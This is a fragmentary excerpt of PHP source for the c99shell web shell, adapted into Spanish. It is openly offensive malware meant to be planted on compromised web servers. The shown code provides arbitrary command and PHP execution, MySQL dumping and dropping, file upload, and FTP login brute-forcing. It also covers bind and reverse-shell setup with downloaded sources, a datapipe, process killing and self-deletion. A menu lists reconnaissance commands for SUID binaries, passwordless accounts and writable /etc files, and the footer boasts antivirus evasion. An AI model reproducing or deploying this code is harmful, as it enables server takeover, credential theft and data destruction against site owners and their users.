<?php 
 ...
 $shver = "1.0 pre-release build #2020"; //Current version 
 //CONFIGURACIONES
 ...
 $accessdeniedmess = "<a href=\"https://github.com/MarbelVega/webshell\">
     c99shell v.".$shver."</a>: access denied"; 
 $gzipencode = TRUE; //Encode with gzip? 
 $updatenow = FALSE; //If TRUE, update now (this variable will be FALSE) 
 $c99sh_updateurl = "https://github.com/MarbelVega/webshell\"; //Update server 
 $c99sh_sourcesurl = "https://github.com/MarbelVega/webshell\"; //Sources-server 
 ...
 $log_email = "user@host.xyz"; //Default e-mail for sending logs
 ...
 */ 
 ...
 $s = "!^(".implode("|",$tmp).")$!i"; 
 if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"https://github.com/MarbelVega/webshell\">c99shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");} 
 if (!empty($login)) 
 { 
 ...
 $ret = array(); 
 $ret["err"] = array(); 
 if (!is_resource($sock)) {echo("Error: \$sock no es un recurso valido.");} 
 if (empty($db)) {$db = "db";} 
 ...
 */ 
 ...
 { 
   ...
   { 
    ...
    { 
     ...
     else {echo "No se puede crear la base de datos \"".htmlspecialchars($sql_newdb)."\".<br>Razon:</b> ".mysql_smarterror();} 
    } 
    elseif ($sql_act == "dump") 
    { 
     if (empty($submit)) 
     ...
     { 
      ...
      { 
       ...
       { 
        fwrite($fp,$ret); 
        fclose($fp); 
        echo "<b>Vaciado! direccion \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>."; 
       } 
      } 
      else {echo "<b>Vaciado: nada que hacer!</b>";} 
     } 
    } 
    if ($diplay) 
    { 
   ...
   { 
    ...
    { 
     ...
     { 
      ...
      mysql_drop_db($tmpdb); //comenta la linea si deseas dejar la base de datos 
     } 
    } 
   } 
 } 
 ...
 if ($mkdir != $d) 
 { 
   if (file_exists($mkdir)) {echo "<b>Creando directorio \"".htmlspecialchars($mkdir)."\"</b>: ya existe";} 
   elseif (!mkdir($mkdir)) {echo "<b>Creando directorio \"".htmlspecialchars($mkdir)."\"</b>: acceso denegado";} 
   echo "<br><br>"; 
 } 
 $act = $dspact = "ls"; 
 } 
 ...
 if (!win) {echo "Estas funciones no son para Windows!<br><br>";} 
 else 
 { 
   ...
   { 
    ...
    { 
     ...
     { 
      ...
      { 
       echo "<b>Conectado a ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>"; 
       $fqb_log .= "Conectado a ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n"; 
     ...
     if ($success == 0) {echo "fallo la conexion!"; $fqb_log .= "fallo la conexion!\r\n";} 
     $ftpquick_t = round(getmicrotime()-$ftpquick_st,4); 
     echo "<hr size=\"1\" noshade><b>Hecho!</b><br>Tiempo (secs.): ".$ftpquick_t."<br>Conexiones: ".$i."<br>Hecho.: <font color=green><b>".$success."</b></font><br>Fallido.:".($i-$success)."</b><br>Conexiones por seg: ".round($i/$ftpquick_t,2)."<br>"; 
 ...
 if ($act == "d") 
 { 
 if (!is_dir($d)) {echo "<center><b>Permiso denegado!</b></center>";} 
 else 
 { 
   ...
   echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Tiempo de creacion</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Tiempo de acceso</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>tiempo de modificacion</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>"; 
 } 
 } 
 if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();} 
 if ($act == "security") 
 { 
 echo "<center><b>Informacion de seguridad del servidor:</b></center><b>Open base directorio: ".$hopenbasedir."</b><br>"; 
 if (!$win) 
 { 
   if ($nixpasswd) 
   { 
 ...
 if ($mkfile != $d) 
 { 
   if (file_exists($mkfile)) {echo "<b>Creacion archivo \"".htmlspecialchars($mkfile)."\"</b>: ya existe";} 
   elseif (!fopen($mkfile,"w")) {echo "<b>Creacion archivo \"".htmlspecialchars($mkfile)."\"</b>: acceso denegado";} 
 ...
 if (count($arr) == 0) {echo "<center><b>El Buffer esta vacio!</b></center>";} 
 ...
 { 
   if (unlink(__FILE__)) {@ob_clean(); echo "Gracias por usar el shell v.".$shver."!"; c99shexit(); } 
 ...
 if ($act == "feedback") 
 { 
 $suppmail = base64_decode("YWRtX2NocmlzdGlhbl92ZWdhQG91dGxvb2suY29t"); 
 if (!empty($submit)) 
 { 
   ...
   echo "<center><b>Gracias por la retroalimentacion! Your ticket ID: ".$ticket.".</b></center>"; 
 } 
 ...
 { 
   echo "<b>Archivo cargado:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST> 
 ...
 { 
   ...
   chdir($tmp); 
   if (empty($ret)) {$arcerr .= "No se puede llamar al archivador (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";} 
   $ret = str_replace("\r\n","\n",$ret); 
   $ret = explode("\n",$ret); 
   ...
   c99_sess_put($sess_data); 
   if (!empty($arcerr)) {echo "<b>Errores con el proceso de archivado:</b><br>".$arcerr;} 
   $act = "ls"; 
 } 
 elseif ($actpastebuff) 
 { 
   ...
   c99_sess_put($sess_data); 
   if (!empty($psterr)) {echo "<b>Copiado con errores:</b><br>".$psterr;} 
   $act = "ls"; 
 } 
 } 
 if ($act == "cmd") 
 ...
 else {echo "<b>Ejecucion de comandos</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}} 
 ...
 if (count($list) == 0) {echo "<center><b>No se puede abrir el directorio (".htmlspecialchars($d).")!</b></center>";} 
 else 
 { 
   //Building array 
   $objects = array(); 
 ...
 { 
   ...
   { 
    ...
    { 
     ...
     if (!$sock) {echo "No me puedo conectar a localhost:".$bind["port"]."! Deberias configurar tu firewall.";} 
     else {echo "Enlazando... ok! Conectado a <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! Deberias usar NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";} 
    } 
    echo "<br>"; 
   } 
 } 
 if (!empty($bcsubmit)) 
 { 
   echo "<b>Resultado de conexion reversa:</b><br>"; 
   $v = $bcsrcs[$bc["src"]]; 
   if (empty($v)) {echo "Archivo no reconocido!<br>";} 
   else 
   { 
    $w = explode(".",$bc["src"]); 
    $ext = $w[count($w)-1]; 
    ...
    @unlink($srcpath); 
    $fp = fopen($srcpath,"ab+"); 
    if (!$fp) {echo "No se pueden escribir fuentes en \"".$srcpath."\"!<br>";} 
    elseif (!$data = c99getsource($bc["src"])) {echo "No se pueden descargar las fuentes!";} 
    else 
    { 
     fwrite($fp,$data,strlen($data)); 
     fclose($fp); 
 ...
 { 
   ...
   if (empty($v)) {echo "Archivo no reconocido!<br>";} 
   elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) {echo "El puerto seleccionado ya esta en uso, selecciona otro!<br>";} 
   else 
   { 
    ...
    $fp = fopen($srcpath,"ab+"); 
    if (!$fp) {echo "No se pueden escribir fuentes en \"".$srcpath."\"!<br>";} 
    elseif (!$data = c99getsource($datapipe["src"])) {echo "No se pueden descargar los recursos!";} 
    else 
    { 
     fwrite($fp,$data,strlen($data)); 
     fclose($fp); 
     ...
     if (!$sock) {echo "No puedo conectarme a localhost:".$datapipe["localport"]."! Deberias configurar tu firewall.";} 
     else {echo "Corriendo datapipe... ok! conectado a <b>".getenv("SERVER_ADDR").":".$datapipe["port"].", y estas conectado a  ".$datapipe["remoteaddr"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>Ver proceso</u></a></center>";} 
    } 
    echo "<br>"; 
   } 
 } 
 ...
 { 
   ...
   { 
    ...
    { 
     ...
     if (posix_kill($pid,$sig)) {echo "OK.esta muerto, amen";} 
     else {echo "ERROR.";} 
    } 
 ...
 else {echo "<b>Ejecucion de codigo PHP</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}} 
 ...
 { 
   ...
   else {echo "<center><b>El archivo no existe (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Crear</u></a></center>";} 
 } 
 else 
 { 
   $r = @file_get_contents($d.$f); 
   ...
   if ($ft == "info") 
   { 
    echo "<b>Informacion:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Ruta</b></td><td> ".$d.$f."</td></tr><tr><td><b>Dimension</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>"; 
    if (!$win) 
    { 
     echo "<tr><td><b>Owner/Group</b></td><td> ";     
 ...
 <P>"; 
   ...
   elseif (!empty($ft)) {echo "<center><b>El tipo seleccionado manualmente es incorrecto.Si piensas que es un error envianos el url y el dump \$GLOBALS.</b></center>";} 
   else {echo "<center><b>Extension desconocida (".$ext."), porfavor selecciona el tipo manualmente.</b></center>";} 
 } 
 } 
 } 
 else 
 ...
 if ($act == "about") {echo "<center><b>Creditos:<br>Adaptado por Netwalkers.<br>Beta-testing .<br>Gracias a todos los que reportan los bugs.<br>todos los bugs a ICQ @C192837 <a href=\"https://icq.im/C192837\"><img src=\"https://icq.im/C192837\" border=0 align=absmiddle></a>.</b>";} 
 ?> 
 ...
 <tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Shadow's tricks <img src="/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> </b></a> ::</b></p></td></tr> 
 <tr> 
   <td width="50%" height="83" valign="top"><center> 
     <div align="center">Comandos utiles 
     </div> 
         ...
         <input type=hidden name="d" value="<?php echo $dispd; ?>"> 
           <SELECT NAME="cmd"> 
             <OPTION VALUE="uname -a">Kernel version 
               <OPTION VALUE="w">Usuarios logeados 
                 <OPTION VALUE="lastlog">Ultima conexion 
                   <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins 
                     <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USUARIO SIN CONTRASENA! 
                     <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Escrito en /etc/? 
                     <OPTION VALUE="which wget curl w3m lynx">Downloaders? 
                     <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO 
                     <OPTION VALUE="netstat -atup | grep IST">Puertos abiertos 
 ...
 <TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1> 
 <tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Preddy's tricks <img src="/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> </b></a> ::</b></p></td></tr> 
 <tr> 
   <td width="50%" height="83" valign="top"><center> 
 ...
 <br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>Revisado por</b></u></a> Netwalkers | <a href="http://algunaurl.com"><font color="#FF0000">Netwalkers</font></a><font color="#FF0000"></font> | Tiempo de generacion: <?php echo round(getmicrotime()-starttime,4); ?> ]--<br><br> coded & antivirus undetected by <a href=mailto:algun-mail@gmail.com>personaje x</a> <font color=red> (HBA) </font> </b></p></td></tr></table> 
